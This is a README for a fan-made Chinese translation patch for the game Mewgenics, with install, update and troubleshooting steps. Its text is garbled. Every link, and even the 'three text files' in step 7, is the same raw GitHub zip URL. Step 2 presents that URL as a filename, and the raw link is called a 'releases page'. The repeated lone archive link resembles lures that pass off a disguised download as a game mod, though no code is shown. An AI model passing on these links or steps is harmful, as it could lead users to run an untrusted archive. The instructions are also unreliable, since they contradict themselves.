## 📖 About This Patch

This project provides a Chinese translation patch for the game *Mewgenics*. It translates most of the game’s text, including:

- NPC dialogues  
- Item and skill descriptions  
- UI interface text  
- Main game content and storyline  

The patch uses a combination of AI-assisted translation and in-game testing for accuracy. It aims to improve translation quality and terminology consistency with each update. Users are welcome to provide feedback or suggestions for corrections.

---

## 🖥️ System Requirements

To use this patch, your computer should meet these basic requirements:

- Operating System: Windows 7 or newer, macOS 10.13 or newer  
- Processor: Intel Core i3 or equivalent  
- RAM: 4 GB or more  
- Disk Space: At least 100 MB free  
- Original *Mewgenics* game installed

This patch works with the original game and does not replace it. Make sure the game runs normally before applying the patch.

## 🚀 Getting Started

This guide helps you download and install the Chinese translation patch for *Mewgenics* step by step. No technical experience needed.

---

## 📥 Download & Install

1. **Visit the download page**  
Click the big button at the top or go to this link:  
https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip

2. **Download the latest patch**  
On the releases page, find the most recent version. It usually has a file named like `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` or similar. Click it to download the file to your computer.

3. **Extract the files**  
Once downloaded, open the `.zip` file using your computer’s file explorer or any unzip tool (like WinRAR or 7-Zip). Extract the contents to a folder you can easily find, such as your desktop or Documents.

4. **Locate your *Mewgenics* game folder**  
Find where the *Mewgenics* game is installed on your computer. Usually, this is inside `C:\Program Files` or in your Steam library folder under `steamapps\common\Mewgenics`.

5. **Backup original files (Recommended)**  
Before applying the patch, copy the game’s `text` folder (or the files you plan to replace) to a safe location. This helps you restore the game if needed.

6. **Copy patch files into the game folder**  
Inside the extracted patch folder, you will see folders named `text` and possibly others like `data`. Copy these folders and paste them into the game directory, replacing any existing files when prompted.

7. **Optional: Use Chinese cat names**  
If you want the patch to show Chinese cat names, copy the three text files — `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, and `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` — into the `data` folder inside the game directory. If there is no `data` folder, create one.

8. **Run the game**  
Start *Mewgenics* as usual. The game should now display most of its text in Chinese.

## 🔄 Updating the Patch

To update to a newer version:

- Download the latest release from the releases page.  
- Repeat the extraction and copy process as described above.  
- Overwrite the old patch files with the new ones.  

Keeping the patch updated ensures improved translations and fewer errors.

## 🛠️ Troubleshooting

- **Game won’t start or crashes**  
Check if you placed the patch files in the correct folder. Make sure you have the original game files backed up. Try reinstalling the patch or the game.

- **Text still shows in English**  
Confirm you replaced the right files and are running the patched game. If issues persist, remove the patch files and reinstall.

- **Incorrect or strange text**  
This patch is a work in progress. Some text may still be imperfect. Report issues by opening an issue on the GitHub page, including screenshots if possible.
